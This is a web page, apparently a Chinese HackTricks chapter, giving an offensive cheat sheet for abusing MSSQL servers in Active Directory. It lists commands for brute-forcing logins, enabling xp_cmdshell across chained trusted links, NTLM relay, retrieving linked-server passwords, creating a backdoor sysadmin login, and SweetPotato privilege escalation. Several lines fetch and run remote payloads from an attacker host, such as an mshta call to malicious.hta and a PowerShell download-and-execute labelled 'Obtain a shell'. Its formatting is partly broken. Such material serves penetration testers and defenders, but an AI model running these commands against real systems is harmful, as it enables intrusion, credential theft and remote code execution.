<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>MSSQL AD Abuse</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="mssql-ad-滥用"><a class="header" href="#mssql-ad-滥用">MSSQL AD 滥用</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h2 id="mssql-枚举--发现"><a class="header" href="#mssql-枚举--发现"><strong>MSSQL 枚举 / 发现</strong></a></h2>
<h3 id="python"><a class="header" href="#python">Python</a></h3>
<p><a href="https://github.com/ScorpionesLabs/MSSqlPwner">MSSQLPwner</a> 工具基于 impacket，允许使用 kerberos 票证进行身份验证，并通过链接链进行攻击。</p>
<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
<h1 id="interactive-mode-with-2-depth-level-of-impersonations"><a class="header" href="#interactive-mode-with-2-depth-level-of-impersonations">Interactive mode with 2 depth level of impersonations</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive</p>
<h1 id="executing-custom-assembly-on-the-current-server-with-windows-authentication-and-executing-hostname-command"><a class="header" href="#executing-custom-assembly-on-the-current-server-with-windows-authentication-and-executing-hostname-command">Executing custom assembly on the current server with windows authentication and executing hostname command</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname</p>
<h1 id="executing-custom-assembly-on-the-current-server-with-windows-authentication-and-executing-hostname-command-on-the-srv01-linked-server"><a class="header" href="#executing-custom-assembly-on-the-current-server-with-windows-authentication-and-executing-hostname-command-on-the-srv01-linked-server">Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname</p>
<h1 id="executing-the-hostname-command-using-stored-procedures-on-the-linked-srv01-server"><a class="header" href="#executing-the-hostname-command-using-stored-procedures-on-the-linked-srv01-server">Executing the hostname command using stored procedures on the linked SRV01 server</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname</p>
<h1 id="executing-the-hostname-command-using-stored-procedures-on-the-linked-srv01-server-with-sp_oacreate-method"><a class="header" href="#executing-the-hostname-command-using-stored-procedures-on-the-linked-srv01-server-with-sp_oacreate-method">Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate</p>
<h1 id="issuing-ntlm-relay-attack-on-the-srv01-server"><a class="header" href="#issuing-ntlm-relay-attack-on-the-srv01-server">Issuing NTLM relay attack on the SRV01 server</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250</p>
<h1 id="issuing-ntlm-relay-attack-on-chain-id-2e9a3696-d8c2-4edd-9bcc-2908414eeb25"><a class="header" href="#issuing-ntlm-relay-attack-on-chain-id-2e9a3696-d8c2-4edd-9bcc-2908414eeb25">Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250</p>
<h1 id="issuing-ntlm-relay-attack-on-the-local-server-with-custom-command"><a class="header" href="#issuing-ntlm-relay-attack-on-the-local-server-with-custom-command">Issuing NTLM relay attack on the local server with custom command</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250</p>
<h1 id="executing-direct-query"><a class="header" href="#executing-direct-query">Executing direct query</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"</p>
<h1 id="retrieving-password-from-the-linked-server-dc01"><a class="header" href="#retrieving-password-from-the-linked-server-dc01">Retrieving password from the linked server DC01</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password</p>
<h1 id="execute-code-using-custom-assembly-on-the-linked-server-dc01"><a class="header" href="#execute-code-using-custom-assembly-on-the-linked-server-dc01">Execute code using custom assembly on the linked server DC01</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll</p>
<h1 id="bruteforce-using-tickets-hashes-and-passwords-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-tickets-hashes-and-passwords-against-the-hosts-listed-on-the-hoststxt">Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt</p>
<h1 id="bruteforce-using-hashes-and-passwords-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-hashes-and-passwords-against-the-hosts-listed-on-the-hoststxt">Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt</p>
<h1 id="bruteforce-using-tickets-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-tickets-against-the-hosts-listed-on-the-hoststxt">Bruteforce using tickets against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt</p>
<h1 id="bruteforce-using-passwords-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-passwords-against-the-hosts-listed-on-the-hoststxt">Bruteforce using passwords against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt</p>
<h1 id="bruteforce-using-hashes-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-hashes-against-the-hosts-listed-on-the-hoststxt">Bruteforce using hashes against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt</p>
<pre><code>### 在没有域会话的情况下从网络枚举
</code></pre>
<h1 id="interactive-mode"><a class="header" href="#interactive-mode">Interactive mode</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive</p>
<pre><code>---
###  Powershell

在这种情况下，powershell 模块 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 非常有用。
```powershell
Import-Module .\PowerupSQL.psd1
</code></pre>
<h3 id="在没有域会话的情况下从网络枚举"><a class="header" href="#在没有域会话的情况下从网络枚举">在没有域会话的情况下从网络枚举</a></h3>
<pre><code class="language-powershell"># Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
</code></pre>
<h3 id="从域内部枚举"><a class="header" href="#从域内部枚举">从域内部枚举</a></h3>
<pre><code class="language-powershell"># Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
</code></pre>
<h2 id="mssql-基本滥用"><a class="header" href="#mssql-基本滥用">MSSQL 基本滥用</a></h2>
<h3 id="访问数据库"><a class="header" href="#访问数据库">访问数据库</a></h3>
<pre><code class="language-powershell">#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
</code></pre>
<h3 id="mssql-rce"><a class="header" href="#mssql-rce">MSSQL RCE</a></h3>
<p>在 MSSQL 主机内部<strong>执行命令</strong>也可能是可行的。</p>
<pre><code class="language-powershell">Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
</code></pre>
<p>检查<strong>以下部分</strong>中提到的页面以了解如何手动执行此操作。</p>
<h3 id="mssql-基本黑客技巧"><a class="header" href="#mssql-基本黑客技巧">MSSQL 基本黑客技巧</a></h3>
<p>{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
<a href="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/">pentesting-mssql-microsoft-sql-server</a>
{% endcontent-ref %}</p>
<h2 id="mssql-受信任链接"><a class="header" href="#mssql-受信任链接">MSSQL 受信任链接</a></h2>
<p>如果一个 MSSQL 实例被另一个 MSSQL 实例信任（数据库链接）。如果用户对受信任的数据库拥有权限，他将能够<strong>利用信任关系在另一个实例中执行查询</strong>。这些信任可以链式连接，在某些情况下，用户可能能够找到一些配置错误的数据库，在那里他可以执行命令。</p>
<p><strong>数据库之间的链接甚至可以跨森林信任工作。</strong></p>
<h3 id="powershell-滥用"><a class="header" href="#powershell-滥用">Powershell 滥用</a></h3>
<pre><code class="language-powershell">#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd &gt; 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "&lt;INSTANCE1&gt;" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "&lt;INSTANCE2&gt;"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
</code></pre>
<h3 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h3>
<p>您可以使用 metasploit 轻松检查受信任的链接。</p>
<pre><code class="language-bash">#Set username, password, windows auth (if using AD), IP...
msf&gt; use exploit/windows/mssql/mssql_linkcrawler
[msf&gt; set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
</code></pre>
<p>注意，metasploit 只会尝试在 MSSQL 中滥用 <code>openquery()</code> 函数（因此，如果您无法使用 <code>openquery()</code> 执行命令，您将需要尝试 <strong>手动</strong> 使用 <code>EXECUTE</code> 方法来执行命令，更多信息见下文。）</p>
<h3 id="手动---openquery"><a class="header" href="#手动---openquery">手动 - Openquery()</a></h3>
<p>从 <strong>Linux</strong> 您可以使用 <strong>sqsh</strong> 和 <strong>mssqlclient.py</strong> 获取 MSSQL 控制台 shell。</p>
<p>从 <strong>Windows</strong> 您也可以找到链接并使用 <strong>MSSQL 客户端如</strong> <a href="https://www.heidisql.com"><strong>HeidiSQL</strong></a> 手动执行命令。</p>
<p><em>使用 Windows 身份验证登录：</em></p>
<p><img src="../../.gitbook/assets/image%20(808).png" alt="" /></p>
<h4 id="查找可信链接"><a class="header" href="#查找可信链接">查找可信链接</a></h4>
<pre><code class="language-sql">select * from master..sysservers;
EXEC sp_linkedservers;
</code></pre>
<p><img src="../../.gitbook/assets/image%20(716).png" alt="" /></p>
<h4 id="在可信链接中执行查询"><a class="header" href="#在可信链接中执行查询">在可信链接中执行查询</a></h4>
<p>通过链接执行查询（示例：在新的可访问实例中查找更多链接）：</p>
<pre><code class="language-sql">select * from openquery("dcorp-sql1", 'select * from master..sysservers')
</code></pre>
<p>{% hint style="warning" %}
检查双引号和单引号的使用，正确使用它们非常重要。
{% endhint %}</p>
<p><img src="../../.gitbook/assets/image%20(643).png" alt="" /></p>
<p>您可以手动无限制地继续这些受信任链接的链。</p>
<pre><code class="language-sql"># First level RCE
SELECT * FROM OPENQUERY("&lt;computer&gt;", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("&lt;computer1&gt;", 'select * from openquery("&lt;computer2&gt;", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
</code></pre>
<p>如果您无法通过 <code>openquery()</code> 执行像 <code>exec xp_cmdshell</code> 这样的操作，请尝试使用 <code>EXECUTE</code> 方法。</p>
<h3 id="手动---execute"><a class="header" href="#手动---execute">手动 - EXECUTE</a></h3>
<p>您还可以使用 <code>EXECUTE</code> 滥用受信任的链接：</p>
<pre><code class="language-bash">#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
</code></pre>
<h2 id="本地权限提升"><a class="header" href="#本地权限提升">本地权限提升</a></h2>
<p><strong>MSSQL 本地用户</strong> 通常具有一种特殊类型的权限，称为 <strong><code>SeImpersonatePrivilege</code></strong>。这允许该账户在身份验证后“模拟客户端”。</p>
<p>许多作者提出的一种策略是强制 SYSTEM 服务向攻击者创建的恶意或中间人服务进行身份验证。这个恶意服务能够在 SYSTEM 服务尝试进行身份验证时模拟该服务。</p>
<p><a href="https://github.com/CCob/SweetPotato">SweetPotato</a> 收集了这些可以通过 Beacon 的 <code>execute-assembly</code> 命令执行的各种技术。</p>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/laps.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/laps.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
